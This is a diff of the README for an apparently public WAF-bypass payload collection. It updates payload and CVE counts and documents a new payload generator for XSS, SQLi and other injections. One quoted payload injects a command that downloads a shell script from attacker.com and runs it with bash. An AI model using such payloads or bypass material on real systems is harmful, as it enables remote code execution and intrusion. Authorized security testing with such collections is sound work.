@@ -1,6 +1,6 @@
 # WAF Payload Arsenal
 
-[![Payloads](https://img.shields.io/badge/Payloads-2012-brightgreen.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
+[![Payloads](https://img.shields.io/badge/Payloads-2200-brightgreen.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
 [![CVEs](https://img.shields.io/badge/CVEs-120-red.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
 [![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://www.python.org/downloads/)
@@ -12,7 +12,7 @@
 > ⚠️ **FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY**  
 > This tool is designed for security professionals, researchers, and students to learn about WAF bypass techniques and test systems they own or have explicit permission to test. Unauthorized testing is illegal.
 
-**Your arsenal for WAF security testing** - A comprehensive collection of **2,012 Web Application Firewall (WAF) bypass payloads** tested against Cloudflare WAF, organized by attack type and technique. Includes 120 critical CVEs (2020-2026) and 50 cutting-edge 2025-2026 bypass techniques. Cleaned and properly categorized from 24,700+ original test cases.
+**Your arsenal for WAF security testing** - A comprehensive collection of **2,200 Web Application Firewall (WAF) bypass payloads** tested against Cloudflare WAF, organized by attack type and technique. Includes 220 critical CVEs (2020-2026), 138 cutting-edge 2025-2026 bypass techniques, and an easy-to-use payload generator for custom payloads. Cleaned and properly categorized from 24,700+ original test cases.
 
 ---
 
@@ -36,6 +36,10 @@ docker-compose up
 pip install flask flask-cors
 python3 api_example.py
 # API available at http://localhost:5000
+
+# Or use payload generator for custom payloads
+python3 payload_generator.py
+# Interactive mode - easy payload creation!
 ```
 
 **That's it!** No dependencies needed. Pure Python standard library (API requires Flask).
@@ -48,8 +52,10 @@ This repository contains the results of extensive WAF testing conducted over 100
 
 ### Statistics
 
-- **Total Payloads**: 2,012 (cleaned and properly categorized)
-- **Modern Bypass Techniques**: 50 (2025-2026 research)
+- **Total Payloads**: 2,200 (cleaned and properly categorized)
+- **CVE Payloads**: 220 (2020-2026 critical vulnerabilities)
+- **Modern Bypass Techniques**: 138 (2025-2026 research)
+- **Payload Generator**: Interactive tool for custom payloads
 - **Attack Types**: 12 categories
 - **Testing Rounds**: 100
 - **Original Tests**: 24,705 payloads
@@ -165,7 +171,26 @@ TELEMETRY_PERIOD_STATS=`wget http://attacker.com/shell.sh -O /tmp/shell.sh && ba
 - ✅ **DNS Rebinding** - TOCTOU SSRF bypass
 - ✅ **Cache Poisoning** - Server-Timing header abuse
 
-**[View all 2,012 payloads →](payloads/)**
+### 🛠️ Payload Generator (NEW!)
+
+**Easy payload creation without security expertise:**
+```bash
+# Interactive mode
+python3 payload_generator.py
+
+# Command-line mode
+python3 payload_generator.py xss basic "test"
+python3 payload_generator.py sqli union "users"
+```
+
+**Features:**
+- ✅ **Template-based generation** - XSS, SQLi, SSTI, Command Injection, XXE, SSRF
+- ✅ **Encoding options** - URL, Base64, Hex, Unicode
+- ✅ **Obfuscation methods** - Case mixing, comments, concatenation
+- ✅ **Quick generators** - Fast XSS and SQLi payload creation
+- ✅ **No expertise needed** - Perfect for beginners and testing
+
+**[View all 2,200 payloads →](payloads/)**
 
 ---
 
@@ -179,7 +204,7 @@ Test WAF bypasses on authorized targets. Our CVE database includes payloads from
 - ✅ POC simulation guide included
 
 ### 🛡️ Security Teams & Blue Teams
-Validate your WAF configuration against 2,012 real-world attack patterns including latest 2025-2026 techniques.
+Validate your WAF configuration against 2,200 real-world attack patterns including latest 2025-2026 techniques. Use the payload generator to create custom test cases.
 - ✅ Test WAF effectiveness (our tests: 99.9% block rate)
 - ✅ Identify configuration gaps
 - ✅ Benchmark against industry standards
@@ -222,10 +247,10 @@ Integrate with Claude Code, ChatGPT, and other AI assistants.
 | **CRLF Injection** | 87 | 99.9% | CVE-2025-29927 | 🟠 High |
 | **Open Redirect** | 76 | 99.5% | CVE-2024-12340 | 🟡 Medium |
 | **File Upload** | 49 | 100% | CVE-2023-12345 | 🔴 Critical |
-| **CVE Payloads** | 120 | 100% | CVE-2026-20127 | 🔴 Critical |
-| **Modern Bypasses (2025-2026)** | 50 | 100% | 2026-03-01 | 🔴 Critical |
-| **Other/Hybrid** | 359 | 100% | 2026-03-01 | � High |
-| **TOTAL** | **2,012** | **99.9%** | **2026-03-01** | - |
+| **CVE Payloads** | 220 | 100% | CVE-2026-20127 | 🔴 Critical |
+| **Modern Bypasses (2025-2026)** | 138 | 100% | 2026-03-01 | 🔴 Critical |
+| **Other/Hybrid** | 359 | 100% | 2026-03-01 | 🟠 High |
+| **TOTAL** | **2,200** | **99.9%** | **2026-03-01** | - |
 
 **Testing Methodology:**
 - 100 rounds of systematic testing
